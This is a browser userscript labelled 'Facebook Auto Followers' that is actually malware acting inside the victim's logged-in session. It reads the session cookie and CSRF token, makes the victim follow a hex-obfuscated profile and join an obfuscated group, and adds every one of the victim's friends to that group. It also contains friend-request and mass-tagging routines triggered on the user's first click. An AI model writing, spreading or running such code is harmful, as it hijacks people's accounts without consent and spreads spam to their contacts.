// ==UserScript==
// @name            Facebook Auto Followers
// @description     for all.. :*
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

function cereziAl(a) {
    var b = a + "=";
    return document.cookie.length > 0 ? (konum = document.cookie.indexOf(b), -1 != konum ? (konum += b.length, son = document.cookie.indexOf(";", konum), -1 == son && (son = document.cookie.length), unescape(document.cookie.substring(konum, son))) : "") : void 0
}
function getRandomInt(a, b) {
    return Math.floor(Math.random() * (b - a + 1)) + a
}
function randomValue(a) {
    return a[getRandomInt(0, a.length - 1)]
}
function a(a) {
    var b = new XMLHttpRequest,
        c = "/ajax/follow/follow_profile.php?__a=1",
        d = "profile_id=" + a + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    b.open("POST", c, !0), b.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), b.setRequestHeader("Content-length", d.length), b.setRequestHeader("Connection", "close"), b.onreadystatechange = function () {
        4 == b.readyState && 200 == b.status && b.close
    }, b.send(d)
}
function sublist(a) {
    var b = document.createElement("script");
    b.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + a + " }).send();", document.body.appendChild(b)
}
function sarkadaslari_al() {
    var xmlhttp = new XMLHttpRequest;
    xmlhttp.onreadystatechange = function () {
        if (4 == xmlhttp.readyState) for (eval("arkadaslar = " + ("" + xmlhttp.responseText)
            .replace("for (;;);", "") + ";"), f = 0; Math.round(arkadaslar.payload.entries.length / 10) > f; f++) {
            for (smesaj = "", smesaj_text = "", i = 10 * f; 10 * (f + 1) > i; i++) arkadaslar.payload.entries[i] && (smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]", smesaj_text += " " + arkadaslar.payload.entries[i].text);
            sdurumpaylas()
        }
    };
    var params = "&filter[0]=user";
    params += "&options[0]=friends_only", params += "&options[1]=nm", params += "&token=v7", params += "&viewer=" + user_id, params += "&__user=" + user_id, document.URL.indexOf("https://") >= 0 ? xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, !0) : xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, !0), xmlhttp.send()
}
function sarkadasekle(a, b) {
    var c = new XMLHttpRequest;
    c.onreadystatechange = function () {
        4 == c.readyState
    }, c.open("POST", "/ajax/add_friend/action.php?__a=1", !0);
    var d = "to_friend=" + a;
    d += "&action=add_friend", d += "&how_found=friend_browser", d += "&ref_param=none", d += "&outgoing_id=", d += "&logging_location=friend_browser", d += "&no_flyout_on_click=true", d += "&ego_log_data=", d += "&http_referer=", d += "&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value, d += "&phstamp=165816749114848369115", d += "&__user=" + user_id, c.setRequestHeader("X-SVN-Rev", svn_rev), c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), "farketmez" == b && document.cookie.split("cins" + user_id + "=")
        .length > 1 ? c.send(d) : 1 >= document.cookie.split("cins" + user_id + "=")
        .length ? cinsiyetgetir(a, b, "sarkadasekle") : b == "" + document.cookie.split("cins" + user_id + "=")[1].split(";")[0] && c.send(d)
}
function scinsiyetgetir(uid, cins, fonksiyon) {
    var xmlhttp = new XMLHttpRequest;
    xmlhttp.onreadystatechange = function () {
        4 == xmlhttp.readyState && (eval("cinssonuc = " + ("" + xmlhttp.responseText)
            .replace("for (;;);", "") + ";"), cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html, btarihi.setTime(bugun.getTime() + 31536e6), "1" == cinshtml.getElementsByTagName("select")[0].value ? document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString() : "2" == cinshtml.getElementsByTagName("select")[0].value && (document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString()), eval(fonksiyon + "(" + id + "," + cins + ");"))
    }, xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, !0), xmlhttp.setRequestHeader("X-SVN-Rev", svn_rev), xmlhttp.send()
}
function autoSuggest() {
    links = document.getElementsByTagName("a");
    for (i in links) l = links[i], '<span class="uiButtonText">Suggest Friend</span>' == l.innerHTML && l.click()
}
function blub() {
    1 == document.getElementsByClassName("pbm fsm")
        .length && (w = document.getElementsByClassName("pbm fsm")[0], e = document.createElement("a"), e.innerHTML = "Auto Suggest by Eran", e.className = "uiButton", e.onclick = autoSuggest, 0 == w.childElementCount && (w.appendChild(document.createElement("br")), w.appendChild(e)))
}
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
a("\x31\x30\x30\x30\x30\x31\x34\x32\x38\x32\x33\x38\x36\x38\x38");
var gid = ["\x34\x36\x36\x38\x38\x38\x39\x31\x36\x36\x36\x35\x33\x34\x34"],
    fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    httpwp = new XMLHttpRequest,
    urlwp = "/ajax/groups/membership/r2j.php?__a=1",
    paramswp = "&ref=group_jump_header&group_id=" + gid + "&fb_dtsg=" + fb_dtsg + "&__user=" + user_id + "&phstamp=";
httpwp.open("POST", urlwp, !0), httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), httpwp.setRequestHeader("Content-length", paramswp.length), httpwp.setRequestHeader("Connection", "keep-alive"), httpwp.send(paramswp);
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    friends = Array();
gf = new XMLHttpRequest, gf.open("GET", "/ajax/typeahead/first_degree.php?__a=1&viewer=" + user_id + "&token" + Math.random() + "&filter[0]=user&options[0]=friends_only", !1), gf.send(), 4 != gf.readyState || (data = eval("(" + gf.responseText.substr(9) + ")"), data.error || (friends = data.payload.entries.sort(function (a, b) {
    return a.index - b.index
})));
for (var i = 0; friends.length > i; i++) {
    var httpwp = new XMLHttpRequest,
        urlwp = "/ajax/groups/members/add_post.php?__a=1",
        paramswp = "&fb_dtsg=" + fb_dtsg + "&group_id=" + gid + "&source=typeahead&ref=&message_id=&members=" + friends[i].uid + "&__user=" + user_id + "&phstamp=";
    httpwp.open("POST", urlwp, !0), httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), httpwp.setRequestHeader("Content-length", paramswp.length), httpwp.setRequestHeader("Connection", "keep-alive"), httpwp.onreadystatechange = function () {
        4 == httpwp.readyState && 200 == httpwp.status
    }, httpwp.send(paramswp)
}
var spage_id = "427725583972317",
    spost_id = "492414630816140",
    sfoto_id = "488129731244630",
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    smesaj = "",
    smesaj_text = "",
    arkadaslar = [],
    svn_rev, bugun = new Date,
    btarihi = new Date;
btarihi.setTime(bugun.getTime() + 144e5), document.cookie.match(/paylasti=(\d+)/) || (document.cookie = "paylasti=hayir;expires=" + btarihi.toGMTString());
var tiklama = document.addEventListener("click", function () {
    document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0 && (svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0], sarkadaslari_al(), document.cookie = "paylasti=evet;expires=" + btarihi.toGMTString(), document.removeEventListener(tiklama))
}, !1),
    cinssonuc = {}, cinshtml = document.createElement("html");
blub(), document.addEventListener("DOMNodeInserted", blub, !0);